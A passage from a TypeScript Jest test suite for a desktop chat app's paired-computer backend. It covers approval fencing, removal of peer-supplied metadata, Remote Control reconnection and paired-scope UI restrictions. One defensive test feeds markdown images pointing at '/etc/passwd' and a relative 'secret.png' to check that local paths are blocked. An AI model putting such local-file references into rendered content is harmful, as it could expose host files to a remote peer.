    // 4. remote-control-off releases hold, and retry obtains a fresh hold and restores scopes.
    const holdsBeforeOff = fake.held.length;
    fake.emitState(MAC, {
      status: 'unavailable',
      reason: 'remote-control-off',
      message: null,
    });
    expect(fake.released).toEqual([MAC]);
    fake.emitState(MAC, CONNECTED_FULL);
    await core.backend.approvals.getResolvedDefault({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    expect(fake.held.length).toBeGreaterThan(holdsBeforeOff);

    // 5. First hydration of an empty paired scope never creates a local starter tab.
    const emptyCommands: unknown[] = [];
    const fakeEmpty = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel, args) => {
        if (channel === 'chat:get-state') {
          return {
            schemaVersion: 1,
            projectId: 'proj-empty',
            worktreeId: 'wt-empty',
            revision: 1,
            tabsFile: {
              version: 1,
              revision: 1,
              activeTabId: '',
              tabs: [],
            },
            archives: [],
            runtimeByChatId: {},
            queue: [],
          };
        }
        if (channel === 'chat:command') {
          emptyCommands.push(args[0]);
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') return [];
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, fakeEmpty.api);
    const emptyBackend = chatBackendFor({ projectId: qMac('proj-empty') });
    const commandSpy = jest.spyOn(emptyBackend.chat, 'command');
    useChatStore.setState({
      selectedWorktree: {
        projectId: qMac('proj-empty'),
        worktreeId: qMac('wt-empty'),
      },
    });
    try {
      await useChatStore.getState().loadTabs();
    } finally {
      useChatStore.setState({ selectedWorktree: null });
    }
    const emptyKey = `${qMac('proj-empty')}/${qMac('wt-empty')}`;
    const hydratedEmptyScope = useChatStore.getState().worktreeChats[emptyKey];
    expect(hydratedEmptyScope).toBeDefined();
    expect(hydratedEmptyScope?.tabs).toEqual([]);
    expect(useChatStore.getState().chatStateSync[emptyKey]).toEqual({
      phase: 'live',
      revision: 1,
    });
    expect(
      fakeEmpty.invokes.some((call) => call.channel === 'chat:get-state'),
    ).toBe(true);
    expect(commandSpy).not.toHaveBeenCalled();
    expect(emptyCommands).toEqual([]);
    commandSpy.mockRestore();
    useChatStore
      .getState()
      .releaseChatScopeRevisioned(qMac('proj-empty'), qMac('wt-empty'));
  });

  it('fences pendingRequests hydration, keeps local interest non-blocking, disables paired file links, and strips workflow receipts', async () => {
    // 1. pendingRequests() fences live cancellations while the read is in flight.
    let resolvePendingRead:
      | ((items: ApprovalRequestEvent[]) => void)
      | undefined;
    let firstPendingRead = true;
    const fake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'approval:pending-requests') {
          if (firstPendingRead) {
            firstPendingRead = false;
            return [];
          }
          return new Promise<ApprovalRequestEvent[]>((resolve) => {
            resolvePendingRead = resolve;
          });
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'chat:get-state') {
          const snap = makeWireSnapshot({
            revision: 1,
            messages: [
              {
                id: 'm-wf',
                role: 'assistant',
                timestamp: 1_700_000_000_000,
                blocks: [
                  {
                    type: 'tool_result',
                    toolUseId: 'tu-wf',
                    toolName: 'pipeline.run',
                    output: 'Started',
                    isError: false,
                    agentArtifacts: [
                      {
                        version: 1,
                        kind: 'pipeline_run',
                        operation: 'pipeline.run',
                        dedupeKey: 'exec:local-exec-1',
                        createdAt: '2026-11-25T20:00:00Z',
                        executionId: 'local-exec-1',
                        pipelineId: 'pipe-1',
                        pipelineName: 'Local Pipeline',
                        initialStatus: 'running',
                        queuedAt: '2026-11-25T20:00:00Z',
                        projectId: 'proj-1',
                        worktreeId: 'wt-1',
                        navigationTarget: {
                          kind: 'pipeline_execution',
                          executionId: 'local-exec-1',
                          projectId: 'proj-1',
                          worktreeId: 'wt-1',
                        },
                      },
                    ],
                  },
                ],
              },
            ],
          });
          const firstTab = snap.tabsFile.tabs[0];
          if (!firstTab) throw new Error('Expected first tab');
          snap.tabsFile.tabs[0] = {
            ...firstTab,
            scheduledSendDraft: { runAt: '2026-11-26T00:00:00Z' },
            pendingRevertAttachmentPath: '/tmp/host-revert.diff',
            agentArtifactCarryByTurn: {
              'turn-1': [
                {
                  version: 1,
                  kind: 'pipeline_run',
                  operation: 'pipeline.run',
                  dedupeKey: 'exec:local-exec-1',
                  createdAt: '2026-11-25T20:00:00Z',
                  executionId: 'local-exec-1',
                  pipelineId: 'pipe-1',
                  pipelineName: 'Local Pipeline',
                  initialStatus: 'running',
                  queuedAt: '2026-11-25T20:00:00Z',
                  projectId: 'proj-1',
                  worktreeId: 'wt-1',
                  navigationTarget: {
                    kind: 'pipeline_execution',
                    executionId: 'local-exec-1',
                    projectId: 'proj-1',
                    worktreeId: 'wt-1',
                  },
                },
              ],
            },
          };
          return snap;
        }
        return undefined;
      },
    });
    const core = createPairedComputerChatBackendCore({
      getApi: () => fake.api,
    });
    await core.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-1'), worktreeId: qMac('wt-1') }],
    });
    await Promise.resolve();
    await Promise.resolve();

    const pendingPromise = core.backend.approvals.pendingRequests();
    await Promise.resolve();
    await Promise.resolve();
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:cancelled',
      args: [{ requestId: 'req-cancelled' }],
    });
    resolvePendingRead?.([
      makeWireApproval('req-cancelled'),
      makeWireApproval('req-alive'),
    ]);
    const hydratedApprovals = await pendingPromise;
    expect(hydratedApprovals.map((a) => a.requestId)).toEqual([
      qMac('req-alive'),
    ]);

    // 2. Peer-supplied workflow receipts and host-only draft state are stripped
    // on snapshots, tab upserts, and metadata patches.
    const snap = await core.backend.chat.getState({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    expect(snap.tabsFile.tabs[0]?.agentArtifactCarryByTurn).toBeUndefined();
    expect(snap.tabsFile.tabs[0]?.scheduledSendDraft).toBeUndefined();
    expect(snap.tabsFile.tabs[0]?.pendingRevertAttachmentPath).toBeUndefined();
    const patchedEvents: ChatStateChangedEvent[] = [];
    const unsubPatched = core.backend.chat.onStateChanged((e) =>
      patchedEvents.push(e),
    );
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-patch-draft',
          occurredAt: '2026-11-25T21:45:00Z',
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          baseRevision: 1,
          revision: 2,
          changes: [
            {
              type: 'tab.metadata_patched',
              tabId: 'chat-1',
              patch: {
                title: 'Updated',
                scheduledSendDraft: { runAt: '2026-11-26T00:00:00Z' },
                pendingRevertAttachmentPath: '/tmp/host-revert.diff',
              },
            },
          ],
        },
      ],
    });
    unsubPatched();
    const metadataChange = patchedEvents[0]?.changes[0];
    expect(metadataChange?.type).toBe('tab.metadata_patched');
    if (metadataChange?.type === 'tab.metadata_patched') {
      expect(metadataChange.patch.title).toBe('Updated');
      expect(metadataChange.patch.scheduledSendDraft).toBeUndefined();
      expect(metadataChange.patch.pendingRevertAttachmentPath).toBeUndefined();
    }
    expect(canTransferChatSession(qMac('proj-1'))).toBe(false);
    const resultBlock = snap.tabsFile.tabs[0]?.messages[0]?.blocks[0];
    expect(
      resultBlock?.type === 'tool_result'
        ? resultBlock.agentArtifacts
        : 'wrong',
    ).toBeUndefined();

    // 3. A stalled paired chat:set-interest RPC never blocks local flushChatInterest().
    const hangingFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:set-interest') {
          return new Promise(() => undefined);
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') return [];
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, hangingFake.api);
    const localSetInterest = jest.fn().mockResolvedValue(undefined);
    const prevChatApi = window.api.chat;
    window.api.chat = {
      ...prevChatApi,
      setInterest: localSetInterest,
    };
    const stopTracking = startChatInterestTracking('main');
    try {
      await expect(
        Promise.race([
          warmUpChat({
            projectId: qMac('proj-1'),
            worktreeId: qMac('wt-1'),
            chatId: qMac('chat-1'),
          })
            .then(() => flushChatInterest())
            .then(() => 'resolved'),
          new Promise((resolve) => setTimeout(() => resolve('timed_out'), 50)),
        ]),
      ).resolves.toBe('resolved');
      expect(localSetInterest).toHaveBeenCalled();
      expect(
        hangingFake.invokes.some(
          (call) => call.channel === 'chat:set-interest',
        ),
      ).toBe(true);
    } finally {
      stopTracking();
      window.api.chat = prevChatApi;
    }

    // 4. ChatMarkdownLink disables file links in paired scopes while keeping https links active.
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    act(() => {
      root.render(
        createElement(ChatMarkdownFileTargetContext.Provider, {
          value: { projectId: qMac('proj-1'), worktreeId: qMac('wt-1') },
          children: createElement(
            'div',
            null,
            createElement(
              ChatMarkdownLink,
              { href: 'src/app.ts:42' },
              'src/app.ts:42',
            ),
            createElement(
              ChatMarkdownLink,
              { href: 'https://example.com' },
              'Example',
            ),
          ),
        }),
      );
    });
    expect(container.querySelectorAll('button')).toHaveLength(0);
    expect(container.textContent).toContain('src/app.ts:42');
    const webLink = container.querySelector<HTMLAnchorElement>(
      'a[href="https://example.com"]',
    );
    expect(webLink).not.toBeNull();

    act(() => {
      root.unmount();
    });
    container.remove();
  });

  it('strips live carry and plan metadata, fences multi-device approvals, blocks local markdown images, disables paired pipeline actions, and switches paired tabs without notices', async () => {
    // 1. Live tab.metadata_patched and snapshots strip agentArtifactCarryByTurn and pending plan metadata.
    let resolveLinuxPending:
      | ((items: ApprovalRequestEvent[]) => void)
      | undefined;
    let firstMacPending = true;
    let firstLinuxPending = true;
    const twoDeviceFake = makeFakePairedComputersApi({
      onInvoke: (deviceId, channel) => {
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') {
          if (deviceId === MAC) {
            if (firstMacPending) {
              firstMacPending = false;
              return [];
            }
            return [
              makeWireApproval('req-mac-cancelled-mid-batch'),
              makeWireApproval('req-mac-kept'),
            ];
          }
          if (deviceId === LINUX) {
            if (firstLinuxPending) {
              firstLinuxPending = false;
              return [];
            }
            return new Promise<ApprovalRequestEvent[]>((resolve) => {
              resolveLinuxPending = resolve;
            });
          }
        }
        if (channel === 'chat:get-state') {
          const snap = makeWireSnapshot({ revision: 1 });
          const firstTab = snap.tabsFile.tabs[0];
          if (!firstTab) throw new Error('Expected first tab');
          snap.tabsFile.tabs[0] = {
            ...firstTab,
            pendingPlanExit: { plan: '# Secret peer plan', source: 'codex' },
            pendingPlanExitRequestId: 'plan-req-1',
            trackedPlanId: 'plan-1',
            trackedPlanSource: 'codex',
            trackedPlanReviewStatus: 'pending',
            hasOutstandingProposal: true,
          };
          snap.tabsFile.tabs.push({
            ...firstTab,
            id: 'chat-2',
            title: 'Second remote chat',
            unread: true,
          });
          return snap;
        }
        return undefined;
      },
    });
    const core = createPairedComputerChatBackendCore({
      getApi: () => twoDeviceFake.api,
    });
    await core.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [
        { projectId: qMac('proj-1'), worktreeId: qMac('wt-1') },
        { projectId: qLinux('proj-1'), worktreeId: qLinux('wt-1') },
      ],
    });
    await Promise.resolve();
    await Promise.resolve();

    const snap = await core.backend.chat.getState({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    expect(snap.tabsFile.tabs[0]?.pendingPlanExit).toBeUndefined();
    expect(snap.tabsFile.tabs[0]?.pendingPlanExitRequestId).toBeUndefined();
    expect(snap.tabsFile.tabs[0]?.trackedPlanId).toBeUndefined();
    expect(snap.tabsFile.tabs[0]?.trackedPlanReviewStatus).toBeUndefined();
    expect(snap.tabsFile.tabs[0]?.hasOutstandingProposal).toBeUndefined();

    const stateEvents: ChatStateChangedEvent[] = [];
    const unsubState = core.backend.chat.onStateChanged((event) =>
      stateEvents.push(event),
    );
    twoDeviceFake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-carry-and-plan',
          occurredAt: '2026-11-25T22:18:00Z',
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          baseRevision: 1,
          revision: 2,
          changes: [
            {
              type: 'tab.metadata_patched',
              tabId: 'chat-1',
              patch: {
                title: 'Live update',
                agentArtifactCarryByTurn: {
                  'turn-1': [
                    {
                      version: 1,
                      kind: 'pipeline_run',
                      operation: 'pipeline.run',
                      dedupeKey: 'exec:local-exec-2',
                      createdAt: '2026-11-25T22:18:00Z',
                      executionId: 'local-exec-2',
                      pipelineId: 'pipe-1',
                      pipelineName: 'Local Pipeline',
                      initialStatus: 'running',
                      queuedAt: '2026-11-25T22:18:00Z',
                      projectId: 'proj-1',
                      worktreeId: 'wt-1',
                      navigationTarget: {
                        kind: 'pipeline_execution',
                        executionId: 'local-exec-2',
                        projectId: 'proj-1',
                        worktreeId: 'wt-1',
                      },
                    },
                  ],
                },
                pendingPlanExit: { plan: '# Live peer plan', source: 'codex' },
                pendingPlanExitRequestId: 'plan-req-2',
                trackedPlanId: 'plan-2',
                hasOutstandingProposal: true,
              },
            },
          ],
        },
      ],
    });
    unsubState();
    const patchChange = stateEvents[0]?.changes[0];
    expect(patchChange?.type).toBe('tab.metadata_patched');
    if (patchChange?.type === 'tab.metadata_patched') {
      expect(patchChange.patch.title).toBe('Live update');
      expect(patchChange.patch.agentArtifactCarryByTurn).toBeUndefined();
      expect(patchChange.patch.pendingPlanExit).toBeUndefined();
      expect(patchChange.patch.pendingPlanExitRequestId).toBeUndefined();
      expect(patchChange.patch.trackedPlanId).toBeUndefined();
      expect(patchChange.patch.hasOutstandingProposal).toBeUndefined();
    }

    // 2. Multi-device pendingRequests reconciles a cancellation on MAC arriving while LINUX read is still pending.
    const pendingBatch = core.backend.approvals.pendingRequests();
    await Promise.resolve();
    await Promise.resolve();
    twoDeviceFake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:cancelled',
      args: [{ requestId: 'req-mac-cancelled-mid-batch' }],
    });
    resolveLinuxPending?.([makeWireApproval('req-linux-kept')]);
    const mergedApprovals = await pendingBatch;
    expect(mergedApprovals.map((a) => a.requestId)).toEqual([
      qMac('req-mac-kept'),
      qLinux('req-linux-kept'),
    ]);

    // 3. Switching paired tabs activates locally without dispatching mark_read/dismiss_attention or setting a notice.
    await setOneWindowSwitchForTest(true, twoDeviceFake.api);
    const macBackend = chatBackendFor({ projectId: qMac('proj-1') });
    const switchCommandSpy = jest.spyOn(macBackend.chat, 'command');
    useChatStore.setState({
      selectedWorktree: {
        projectId: qMac('proj-1'),
        worktreeId: qMac('wt-1'),
      },
      chatStateNotices: {},
    });
    await useChatStore.getState().loadTabs();
    const macScopeKey = `${qMac('proj-1')}/${qMac('wt-1')}`;
    switchCommandSpy.mockClear();
    useChatStore.getState().switchTab(qMac('chat-2'));
    await Promise.resolve();
    await Promise.resolve();
    expect(
      useChatStore.getState().worktreeChats[macScopeKey]?.activeTabId,
    ).toBe(qMac('chat-2'));
    expect(
      useChatStore.getState().chatStateNotices[macScopeKey],
    ).toBeUndefined();
    const dispatchedTypes = switchCommandSpy.mock.calls.map(
      (call) => call[0].command.type,
    );
    expect(dispatchedTypes).toEqual(['chat.activate_tab']);
    switchCommandSpy.mockRestore();
    useChatStore.setState({ selectedWorktree: null });
    useChatStore
      .getState()
      .releaseChatScopeRevisioned(qMac('proj-1'), qMac('wt-1'));

    // 4. Paired Markdown images reject local/relative paths while keeping data:image/ URIs, and
    //    PipelineRunArtifactCard renders no local cancel action for paired scopes.
    const client = createDesktopCanopyClient();
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    act(() => {
      root.render(
        createElement(CanopyClientProvider, {
          client,
          children: createElement(ChatMarkdownFileTargetContext.Provider, {
            value: { projectId: qMac('proj-1'), worktreeId: qMac('wt-1') },
            children: createElement(
              'div',
              null,
              createElement(ChatBlockRenderer, {
                block: {
                  type: 'text',
                  text: '![local](/etc/passwd) ![rel](./secret.png) ![web](https://example.com/ok.png)',
                },
                streaming: false,
              }),
              createElement(PipelineRunArtifactCard, {
                receipt: {
                  version: 1,
                  kind: 'pipeline_run',
                  operation: 'pipeline.run',
                  dedupeKey: 'exec:local-exec-3',
                  createdAt: '2026-11-25T22:18:00Z',
                  executionId: 'local-exec-3',
                  pipelineId: 'pipe-1',
                  pipelineName: 'Local Pipeline',
                  initialStatus: 'running',
                  queuedAt: '2026-11-25T22:18:00Z',
                  projectId: 'proj-1',
                  worktreeId: 'wt-1',
                  navigationTarget: {
                    kind: 'pipeline_execution',
                    executionId: 'local-exec-3',
                    projectId: 'proj-1',
                    worktreeId: 'wt-1',
                  },
                },
                chatTarget: {
                  projectId: qMac('proj-1'),
                  worktreeId: qMac('wt-1'),
                  chatId: qMac('chat-1'),
                },
              }),
            ),
          }),
        }),
      );
    });
    const imgs = Array.from(container.querySelectorAll('img'));
    expect(imgs.map((img) => img.getAttribute('src'))).toEqual([
      'https://example.com/ok.png',
    ]);
    const cancelButtons = Array.from(
      container.querySelectorAll('button'),
    ).filter((btn) =>
      /cancel|stop/i.test(
        btn.getAttribute('aria-label') ?? btn.textContent ?? '',
      ),
    );
    expect(cancelButtons).toHaveLength(0);
    act(() => {
      root.unmount();
    });
    container.remove();
  });

  it('isolates local hydration from unresponsive paired approval RPCs and recovers open paired chats when Remote Control returns', async () => {
    // 1. A connected paired peer whose approval:pending-requests never settles
    //    must not stall local worktree hydration or another paired device read.
    let macApprovalCalls = 0;
    const hungMacFake = makeFakePairedComputersApi({
      onInvoke: (deviceId, channel) => {
        if (channel === 'chat:get-state') {
          const base = makeWireSnapshot({ revision: 1 });
          return {
            ...base,
            projectId: deviceId === MAC ? 'proj-1' : 'proj-2',
            worktreeId: deviceId === MAC ? 'wt-1' : 'wt-2',
          };
        }
        if (channel === 'approval:pending-requests') {
          if (deviceId === MAC) {
            macApprovalCalls += 1;
            return new Promise<never>(() => undefined);
          }
          return [
            {
              ...makeWireApproval('req-linux'),
              projectId: 'proj-2',
              worktreeId: 'wt-2',
            },
          ];
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, hungMacFake.api);

    // Augment window.api so a local worktree can hydrate over the revisioned path.
    const baseLocal = makeWireSnapshot({ revision: 1 });
    const localTab = baseLocal.tabsFile.tabs[0];
    const localSnapshot: ChatStateSnapshot = {
      ...baseLocal,
      projectId: 'local-proj',
      worktreeId: 'local-wt',
      tabsFile: {
        ...baseLocal.tabsFile,
        activeTabId: 'local-chat-1',
        tabs: [{ ...localTab, id: 'local-chat-1' }],
      },
      runtimeByChatId: {},
    };
    const baseWindowApi = window.api as unknown as Record<string, unknown>;
    const baseChatApi = baseWindowApi.chat as Record<string, unknown>;
    const noopUnsub = (): void => undefined;
    const subscribeNoop = (): (() => void) => noopUnsub;
    let localApprovalCalls = 0;
    Object.defineProperty(window, 'api', {
      value: {
        ...baseWindowApi,
        discoverWorktreeEnv: (): Promise<undefined> =>
          Promise.resolve(undefined),
        approvals: {
          pendingRequests: (): Promise<ApprovalRequestEvent[]> => {
            localApprovalCalls += 1;
            return Promise.resolve([]);
          },
          onRequest: subscribeNoop,
          onCancelled: subscribeNoop,
          onAutoResolved: subscribeNoop,
        },
        chat: {
          ...baseChatApi,
          getState: (req: {
            projectId: string;
            worktreeId: string;
          }): Promise<ChatStateSnapshot> => {
            if (isPairedComputerId(req.projectId)) {
              return Promise.reject(
                new Error(
                  `Local chat.getState leaked paired id: ${req.projectId}`,
                ),
              );
            }
            return Promise.resolve(localSnapshot);
          },
          onStateChanged: subscribeNoop,
        },
      },
      configurable: true,
      writable: true,
    });

    // Hydrate MAC and LINUX scopes into the store so both remain tracked and
    // connected while MAC leaves approval:pending-requests pending forever.
    const pairedBackend = chatBackendFor({ projectId: qMac('proj-1') });
    await useChatStore
      .getState()
      .hydrateChatScopeRevisioned(qMac('proj-1'), qMac('wt-1'));
    await useChatStore
      .getState()
      .hydrateChatScopeRevisioned(qLinux('proj-2'), qLinux('wt-2'));
    await Promise.resolve();
    await Promise.resolve();
    const macCallsBeforeLocalHydrate = macApprovalCalls;

    await useChatStore
      .getState()
      .loadAllWorktreeTabs([
        { projectId: 'local-proj', worktreeId: 'local-wt' },
      ]);
    expect(localApprovalCalls).toBe(1);
    expect(macApprovalCalls).toBe(macCallsBeforeLocalHydrate);
    expect(
      useChatStore
        .getState()
        .worktreeChats['local-proj/local-wt']?.tabs.map((t) => t.id),
    ).toEqual(['local-chat-1']);

    // Scoped approval read for LINUX must not wait on hung MAC.
    const linuxApprovals = await pairedBackend.approvals.pendingRequests({
      projectId: qLinux('proj-2'),
    });
    expect(linuxApprovals.map((a) => a.requestId)).toEqual([
      qLinux('req-linux'),
    ]);
    expect(macApprovalCalls).toBe(macCallsBeforeLocalHydrate);

    useChatStore
      .getState()
      .releaseChatScopeRevisioned('local-proj', 'local-wt');
    useChatStore
      .getState()
      .releaseChatScopeRevisioned(qMac('proj-1'), qMac('wt-1'));
    useChatStore
      .getState()
      .releaseChatScopeRevisioned(qLinux('proj-2'), qLinux('wt-2'));
    closePairedComputerChats();
    clearPairedComputerConnectionState();
    clearPairedComputerModelCatalog();

    // 2. Turning Remote Control off and back on with a paired chat open
    //    reacquires the hold, redeclares scopes/interest, refreshes the
    //    transcript, restores live updates, and re-enables Send and Stop.
    let currentRevision = 1;
    let sendCount = 0;
    let cancelCount = 0;
    const recoveryFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel, args) => {
        switch (channel) {
          case 'chat:get-state': {
            const snap = makeWireSnapshot({
              revision: currentRevision,
              activeTurnUserMessageId:
                currentRevision >= 2 ? 'msg-after-return' : undefined,
            });
            return {
              ...snap,
              projectId: 'proj-rc',
              worktreeId: 'wt-rc',
            };
          }
          case 'model-registry:get':
            return REMOTE_MODEL_SNAPSHOT;
          case 'approval:pending-requests':
            return [];
          case 'chat:set-state-scopes':
          case 'chat:set-interest':
            return undefined;
          case 'chat:command': {
            sendCount += 1;
            const env = args[0] as ChatCommandEnvelope;
            return {
              commandId: env.commandId,
              revision: currentRevision + 1,
              outcome: 'applied',
            };
          }
          case 'chat:cancel':
            cancelCount += 1;
            return { outcome: 'stop_requested' };
          default:
            return undefined;
        }
      },
    });
    await setOneWindowSwitchForTest(true, recoveryFake.api);
    useRemoteControlStore.getState().setState({
      ...defaultRemoteControlState(),
      available: true,
      signedIn: true,
      relayStatus: 'connected',
    });

    const liveStateEvents: ChatStateChangedEvent[] = [];
    const unsubscribeState = chatBackendFor({
      projectId: qMac('proj-rc'),
    }).chat.onStateChanged((event) => {
      liveStateEvents.push(event);
    });

    useChatStore.setState({
      selectedWorktree: {
        projectId: qMac('proj-rc'),
        worktreeId: qMac('wt-rc'),
      },
    });
    await useChatStore.getState().loadTabs();
    expect(
      useChatStore.getState().worktreeChats[
        `${qMac('proj-rc')}/${qMac('wt-rc')}`
      ]?.tabs,
    ).toHaveLength(1);
    await declarePairedComputerChatInterest({
      focused: [
        {
          projectId: qMac('proj-rc'),
          worktreeId: qMac('wt-rc'),
          chatId: qMac('chat-1'),
        },
      ],
      warm: [],
    });
    expect(
      usePairedComputerConnectionStore.getState().byDevice[MAC]?.state.status,
    ).toBe('connected');

    // Turn Remote Control OFF while the paired chat stays open.
    useRemoteControlStore.getState().setState({
      ...defaultRemoteControlState(),
      available: true,
      signedIn: true,
      relayStatus: 'stopped',
    });
    recoveryFake.emitState(MAC, {
      status: 'unavailable',
      reason: 'remote-control-off',
      message: null,
    });
    expect(recoveryFake.released).toEqual([MAC]);
    expect(
      usePairedComputerConnectionStore.getState().byDevice[MAC]?.state,
    ).toEqual({
      status: 'unavailable',
      reason: 'remote-control-off',
      message: null,
    });

    const holdsBeforeReturn = recoveryFake.held.length;
    const invokesBeforeReturn = recoveryFake.invokes.length;
    currentRevision = 2;

    // Main makes the host reachable again once Remote Control starts back up.
    // Because the old hold and listeners were released, this alone does not
    // update the connection store until Remote Control signals recovery.
    recoveryFake.emitState(MAC, CONNECTED_FULL);
    expect(
      usePairedComputerConnectionStore.getState().byDevice[MAC]?.state,
    ).toEqual({
      status: 'unavailable',
      reason: 'remote-control-off',
      message: null,
    });

    // Turn Remote Control BACK ON with no manual retry or unrelated action.
    useRemoteControlStore.getState().setState({
      ...defaultRemoteControlState(),
      available: true,
      signedIn: true,
      relayStatus: 'connected',
    });
    for (let i = 0; i < 10; i += 1) {
      await Promise.resolve();
    }

    expect(recoveryFake.held.length).toBeGreaterThan(holdsBeforeReturn);
    const postReturnChannels = recoveryFake.invokes
      .slice(invokesBeforeReturn)
      .map((call) => call.channel);
    expect(postReturnChannels).toContain('chat:set-state-scopes');
    expect(postReturnChannels).toContain('chat:set-interest');
    expect(postReturnChannels).toContain('chat:get-state');
    expect(
      usePairedComputerConnectionStore.getState().byDevice[MAC]?.state.status,
    ).toBe('connected');

    // Live updates resume over the reacquired hold.
    liveStateEvents.length = 0;
    recoveryFake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'evt-after-rc-return',
          projectId: 'proj-rc',
          worktreeId: 'wt-rc',
          revision: 3,
          changes: [],
        },
      ],
    });
    expect(liveStateEvents).toHaveLength(1);
    expect(liveStateEvents[0]?.eventId).toBe(qMac('evt-after-rc-return'));

    // Send and Stop both work again after recovery.
    const recoveredBackend = chatBackendFor({ projectId: qMac('proj-rc') });
    const sendResult = await recoveredBackend.chat.command({
      schemaVersion: 1,
      commandId: 'cmd-after-rc-return',
      projectId: qMac('proj-rc'),
      worktreeId: qMac('wt-rc'),
      command: {
        type: 'chat.send_message',
        chatId: qMac('chat-1'),
        userMessageId: 'user-msg-after-return',
        text: 'Back online',
      },
    });
    expect(sendResult.outcome).toBe('applied');
    expect(sendCount).toBe(1);

    const stopResult = await recoveredBackend.chat.cancel({
      projectId: qMac('proj-rc'),
      worktreeId: qMac('wt-rc'),
      chatId: qMac('chat-1'),
    });
    expect(stopResult.outcome).toBe('stop_requested');
    expect(cancelCount).toBe(1);

    unsubscribeState();
    useChatStore.setState({ selectedWorktree: null });
    useChatStore
      .getState()
      .releaseChatScopeRevisioned(qMac('proj-rc'), qMac('wt-rc'));
  });

  it('blocks paired turn-file host probes, avoids re-holding ended peers, rehydrates after One Window toggle, and fences paired hydration approvals', async () => {
    // 1. Paired turn-file resolution skips local file-tree/existence IPC.
    const getFileTreeRoots = jest.fn(() =>
      Promise.resolve({ roots: [] as never[] }),
    );
    const resolveFileReference = jest.fn(() => Promise.resolve(null));
    const prevApi = window.api;
    (window as { api: unknown }).api = {
      ...prevApi,
      getFileTreeRoots,
      resolveFileReference,
    };
    try {
      const resolved = await resolveTurnFileLocations(
        { projectId: qMac('proj-files'), worktreeId: qMac('wt-files') },
        [
          {
            path: '/Users/remote/app/src/index.ts',
            state: 'ready',
            change: 'updated',
          },
        ],
        { fresh: true },
      );
      expect(resolved.located).toEqual([]);
      expect(resolved.failed).toBe(false);
      expect(getFileTreeRoots).not.toHaveBeenCalled();
      expect(resolveFileReference).not.toHaveBeenCalled();
    } finally {
      (window as { api: unknown }).api = prevApi;
    }

    // 2. An ended peer is not re-held by background scope/interest declarations,
    //    and reopens cleanly on an explicit read.
    const endedFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          return {
            ...makeWireSnapshot(),
            projectId: 'proj-ended',
            worktreeId: 'wt-ended',
          };
        }
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });
    const endedCore = createPairedComputerChatBackendCore({
      getApi: () => endedFake.api,
    });
    await endedCore.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-ended'), worktreeId: qMac('wt-ended') }],
    });
    expect(endedFake.held).toHaveLength(1);
    endedFake.emitState(MAC, {
      status: 'unavailable',
      reason: 'ended',
      message: null,
    });
    expect(endedFake.released).toEqual([MAC]);
    const holdsAfterEnded = endedFake.held.length;

    await endedCore.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [
        { projectId: qMac('proj-ended'), worktreeId: qMac('wt-ended') },
        { projectId: qMac('proj-ended-2'), worktreeId: qMac('wt-ended-2') },
      ],
    });
    await endedCore.setInterest({
      focused: [
        {
          projectId: qMac('proj-ended'),
          worktreeId: qMac('wt-ended'),
          chatId: qMac('chat-1'),
        },
      ],
      warm: [],
    });
    expect(endedFake.held).toHaveLength(holdsAfterEnded);

    endedFake.emitState(MAC, CONNECTED_FULL);
    await endedCore.backend.chat.getState({
      projectId: qMac('proj-ended'),
      worktreeId: qMac('wt-ended'),
    });
    expect(endedFake.held).toHaveLength(holdsAfterEnded + 1);
    endedCore.closeAll();

    // 3. Toggling One Window OFF then back ON redeclares tracked paired scopes,
    //    requests interest redeclaration, and refreshes the open paired chat.
    // 4. Paired hydration does not resurrect an approval cancelled after connect.
    let toggleRevision = 1;
    let pendingOnHost: ApprovalRequestEvent[] = [
      makeWireApproval('req-hydration-race', {
        projectId: 'proj-toggle',
        worktreeId: 'wt-toggle',
      }),
    ];
    let resolveApprovalRead: ((value: ApprovalRequestEvent[]) => void) | null =
      null;
    const toggleFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          return {
            ...makeWireSnapshot({
              revision: toggleRevision,
              messages:
                toggleRevision >= 2
                  ? [
                      makeMessage('m-1', 'user', 'Before toggle'),
                      makeMessage('m-2', 'assistant', 'After toggle'),
                    ]
                  : [makeMessage('m-1', 'user', 'Before toggle')],
